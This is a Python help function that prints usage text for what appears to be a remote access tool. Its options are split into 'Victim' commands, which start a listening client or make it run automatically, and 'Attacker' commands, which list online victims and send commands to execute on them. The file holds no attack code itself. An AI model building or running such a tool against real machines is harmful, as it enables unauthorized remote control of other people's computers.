def help():
    print("""
    Usage:

    Victim:
        python main.py -l
        python main.py -r

    Attacker:
        python main.py -ol
        python main.py -c <client_id> <command_injection>

    Options:
        -h, --help            Show help message
        -v, --version         Show version information

    Victim Options:
        -l, --listen          Start the client and wait for connections
        -r, --run             Automatic start client script  

    Attacker Options:
        -ol, --online-list    List online clients
        -c, --connect         Connect to a client

    Arguments:
        <client_id>           Target client ID
        <command_injection>             Command to execute
    """)